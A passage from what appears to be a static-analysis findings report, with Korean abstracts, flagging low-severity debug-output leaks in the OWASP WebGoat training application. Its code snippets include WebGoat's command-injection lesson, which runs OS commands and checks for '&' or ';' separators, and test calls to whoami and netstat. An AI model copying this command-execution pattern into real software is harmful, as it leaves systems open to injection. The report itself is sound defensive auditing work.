	results = Exec.execTimeout("c:/swarm-2.1.1/bin/sleep.exe 20", 5 * 1000);
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 7:ExecTimeout process waits for input");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>357</LineStart>
<Snippet>	    catch (IOException e2)
	    {
		results.setThrowable(e2);
	    }
	    finally</Snippet>
<TargetFunction>Read e2()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="22527F24D3F8FE925A856B7C8B72C8B4" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 524 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>524</LineStart>
<Snippet>	results = Exec.execInput("find \"cde\"",
		"abcdefg1\nhijklmnop\nqrstuv\nabcdefg2");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 4:execTimeout");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>403</LineStart>
<Snippet>	    catch (IOException e3)
	    {
		results.setThrowable(e3);
	    }
	    finally</Snippet>
<TargetFunction>Read e3()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AEF7714EF128EC0759E538D410EA2161" ruleID="9AB0476C-1D90-40DE-B4EA-C1420A8AC2F0">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 함수는 193 줄의 log()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. log()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>193</LineStart>
<Snippet>	{
	    t.printStackTrace();
	    log("ERROR: " + t);
	    screen = new ErrorScreen(mySession, t);
	}</Snippet>
<TargetFunction>javax.servlet.GenericServlet.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>193</LineStart>
<Snippet>	{
	    t.printStackTrace();
	    log("ERROR: " + t);
	    screen = new ErrorScreen(mySession, t);
	}</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="07DC81F1724D3DD1F052EE4103383C30" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 509 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>509</LineStart>
<Snippet>		+ "TEST 1: execSimple");
	results = Exec.execSimple("c:/swarm-2.1.1/bin/whoami.exe");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 2: execSimple (with search)");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>317</LineStart>
<Snippet>		catch (IOException e1)
		{
		    results.setThrowable(e1);
		}
	    }</Snippet>
<TargetFunction>Read e1()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="99230E892495D721C9D0F9664711B616" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 log() 함수는 307 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>307</LineStart>
<Snippet>		+ request.getRemoteAddr() + " | " + message;
	log(output);
	System.out.println(output);
    }
</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>206</LineStart>
<Snippet>		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());
	    }
	    // System.out.println( "HH Leaving doPost: " );</Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="22527F24D3F8FE925A856B7C8B72C8B2" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 509 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>509</LineStart>
<Snippet>		+ "TEST 1: execSimple");
	results = Exec.execSimple("c:/swarm-2.1.1/bin/whoami.exe");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 2: execSimple (with search)");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>403</LineStart>
<Snippet>	    catch (IOException e3)
	    {
		results.setThrowable(e3);
	    }
	    finally</Snippet>
<TargetFunction>Read e3()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D42EE8E21E26F04DEDA180BCCC4932FB" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CommandInjection.java의 exec() 함수는 264 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>264</LineStart>
<Snippet>    private String exec(WebSession s, String command)
    {
	System.out.println("Executing OS command: " + command);
	ExecResults er = Exec.execSimple(command);
	if ((command.indexOf("&amp;") != -1 || command.indexOf(";") != -1)</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>152</LineStart>
<Snippet>		}
	    }
	    File safeDir = new File(s.getContext().getRealPath("/lesson_plans"));

	    ec</Snippet>
<TargetFunction>javax.servlet.ServletContext.getRealPath()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="22527F24D3F8FE925A856B7C8B72C8B8" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 540 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>540</LineStart>
<Snippet>		+ "TEST 7:ExecTimeout process waits for input");
	results = Exec.execTimeout("c:/swarm-2.1.1/bin/cat", 5 * 1000);
	System.out.println(results);
    }
}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>403</LineStart>
<Snippet>	    catch (IOException e3)
	    {
		results.setThrowable(e3);
	    }
	    finally</Snippet>
<TargetFunction>Read e3()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F0879411EBC690469AFC6E5E7FF4EDC1" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AbstractLesson.java의 makeSourceDump_DELETEME() 함수는 960 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>960</LineStart>
<Snippet>	catch (IOException e)
	{
	    System.out.println("reading file EXCEPTION: " + filename);
	    s.setMessage("Could not find source file");
	}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>719</LineStart>
<Snippet>	{
		// Note: doesn't work for admin path! Maybe with a ../ attack
		return ( context.getRealPath( fileName ));
	}
</Snippet>
<TargetFunction>javax.servlet.ServletContext.getRealPath()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0B38BCEEE7F2B81F7433FA988C11E625" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 makeConnection() 함수는 95 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>95</LineStart>
<Snippet>	    {
		dbName = dbName.concat("webgoat.mdb");
		System.out.println("DBName: " + dbName);
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		return DriverManager</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>282</LineStart>
<Snippet>
		// FIXME: hack to save context for web service calls
		DatabaseUtilities.servletContextRealPath = context.getRealPath("/");
		System.out.println("Context Path: " + DatabaseUtilities.servletContextRealPath);
		// FIXME: need to solve concurrency problem here -- make tables for this user</Snippet>
<TargetFunction>javax.servlet.ServletContext.getRealPath()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3A7DC2F9278F84DF5C08F77910337A76" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CommandInjection.java의 exec() 함수는 285 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>285</LineStart>
<Snippet>    private String exec(WebSession s, String[] command)
    {
	System.out.println("Executing OS command: " + Arrays.asList(command));
	ExecResults er = Exec.execSimple(command);
	if (!er.getError())</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>152</LineStart>
<Snippet>		}
	    }
	    File safeDir = new File(s.getContext().getRealPath("/lesson_plans"));

	    ec</Snippet>
<TargetFunction>javax.servlet.ServletContext.getRealPath()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="22527F24D3F8FE925A856B7C8B72C8B3" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 513 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>513</LineStart>
<Snippet>		+ "TEST 2: execSimple (with search)");
	results = Exec.execSimple("netstat -r");
	System.out.println(results);

	if (results.outputContains("localhost:1031"))</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>403</LineStart>
<Snippet>	    catch (IOException e3)
	    {
		results.setThrowable(e3);
	    }
	    finally</Snippet>
<TargetFunction>Read e3()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F82BAB3CD0F3C4174E4E45AD5A4AC747" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 528 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>528</LineStart>
<Snippet>		+ "TEST 4:execTimeout");
	results = Exec.execTimeout("ping -t 127.0.0.1", 5 * 1000);
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 5:execLazy");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>357</LineStart>
<Snippet>	    catch (IOException e2)
	    {
		results.setThrowable(e2);
	    }
	    finally</Snippet>
<TargetFunction>Read e2()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BC4C3AFB66A9949C193A3809DDA9E40C" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AbstractLesson.java의 getFileMethod() 함수는 422 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>422</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>422</LineStart>
<Snippet>	catch (Exception e)
	{
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1FB2CF819183512D88277250FA30C246" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WebSession.java의 getDatabaseConnectionString() 함수는 439 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>439</LineStart>
<Snippet>		{
			String path = context.getRealPath( "/database" ).replace( '\\', '/' );
			System.out.println( "PATH: " + path );
			String realConnectionString = databaseConnectionString.replaceAll( "PATH", path );
			System.out.println( "Database Connection String: " + realConnectionString );</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>438</LineStart>
<Snippet>		try
		{
			String path = context.getRealPath( "/database" ).replace( '\\', '/' );
			System.out.println( "PATH: " + path );
			String realConnectionString = databaseConnectionString.replaceAll( "PATH", path );</Snippet>
<TargetFunction>javax.servlet.ServletContext.getRealPath()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="159D205600BB0BD92FC54008D21A504B" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 509 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>509</LineStart>
<Snippet>		+ "TEST 1: execSimple");
	results = Exec.execSimple("c:/swarm-2.1.1/bin/whoami.exe");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 2: execSimple (with search)");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>433</LineStart>
<Snippet>	catch (Throwable t)
	{
	    results.setThrowable(t);
	}
	finally</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="07DC81F1724D3DD1F052EE4103383C36" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 540 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>540</LineStart>
<Snippet>		+ "TEST 7:ExecTimeout process waits for input");
	results = Exec.execTimeout("c:/swarm-2.1.1/bin/cat", 5 * 1000);
	System.out.println(results);
    }
}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>317</LineStart>
<Snippet>		catch (IOException e1)
		{
		    results.setThrowable(e1);
		}
	    }</Snippet>
<TargetFunction>Read e1()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BEB4814E49EAA11F2CEA573D16ECDB6E" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>LessonAdapter.java의 createStagedContent() 함수는 136 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>136</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LessonAdapter.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LessonAdapter.java</FilePath>
<LineStart>136</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    System.out.println(e);
	    e.printStackTrace();
	}</Snippet>
<TargetFunction>Read e()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7D8CAD12B3387E1132E4326F7AB02256" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 dumpSession() 함수는 246 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>246</LineStart>
<Snippet>	    Object value = session.getAttribute(name);
	    System.out.println("Name: " + name);
	    System.out.println("Value: " + value);
	}
    }</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>PathBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/PathBasedAccessControl.java</FilePath>
<LineStart>71</LineStart>
<Snippet>	try
	{
	    String dir = s.getContext().getRealPath("/lesson_plans");
	    File d = new File(dir);
</Snippet>
<TargetFunction>javax.servlet.ServletContext.getRealPath()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C7904A5B11FD09A0ECD5EAF045A3EA81" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WebSession.java의 WebSession() 함수는 283 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>283</LineStart>
<Snippet>		// FIXME: hack to save context for web service calls
		DatabaseUtilities.servletContextRealPath = context.getRealPath("/");
		System.out.println("Context Path: " + DatabaseUtilities.servletContextRealPath);
		// FIXME: need to solve concurrency problem here -- make tables for this user
		if ( !databaseBuilt )</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>282</LineStart>
<Snippet>
		// FIXME: hack to save context for web service calls
		DatabaseUtilities.servletContextRealPath = context.getRealPath("/");
		System.out.println("Context Path: " + DatabaseUtilities.servletContextRealPath);
		// FIXME: need to solve concurrency problem here -- make tables for this user</Snippet>
<TargetFunction>javax.servlet.ServletContext.getRealPath()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="395FF4482C440E0DFFFDBE3D38ACE125" ruleID="9AB0476C-1D90-40DE-B4EA-C1420A8AC2F0">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 log() 함수는 306 줄의 log()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. log()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>306</LineStart>
<Snippet>	String output = new Date() + " | " + request.getRemoteHost() + ":"
		+ request.getRemoteAddr() + " | " + message;
	log(output);
	System.out.println(output);
    }</Snippet>
<TargetFunction>javax.servlet.GenericServlet.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>206</LineStart>
<Snippet>		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());
	    }
	    // System.out.println( "HH Leaving doPost: " );</Snippet>
<TargetFunction>java.lang.Throwable.getMessage()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1FE7508C40927C517327465F98EAAB61" ruleID="9AB0476C-1D90-40DE-B4EA-C1420A8AC2F0">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>LessonSource.java의 doPost() 함수는 94 줄의 log()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. log()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>94</LineStart>
<Snippet>	{
	    t.printStackTrace();
	    log("ERROR: " + t);
	}
	finally</Snippet>
<TargetFunction>javax.servlet.GenericServlet.log()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>94</LineStart>
<Snippet>	{
	    t.printStackTrace();
	    log("ERROR: " + t);
	}
	finally</Snippet>
<TargetFunction>Read t()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F82BAB3CD0F3C4174E4E45AD5A4AC748" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 532 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>532</LineStart>
<Snippet>		+ "TEST 5:execLazy");
	results = Exec.execLazy("ping -t 127.0.0.1");
	System.out.println(results);
	System.out.println("-------------------------------------------" + sep
		+ "TEST 6:ExecTimeout process never outputs");</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>357</LineStart>
<Snippet>	    catch (IOException e2)
	    {
		results.setThrowable(e2);
	    }
	    finally</Snippet>
<TargetFunction>Read e2()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="159D205600BB0BD92FC54008D21A5051" ruleID="DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A">
                            <Category>System Information Leak: Internal</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Exec.java의 main() 함수는 540 줄의 println()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. println()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
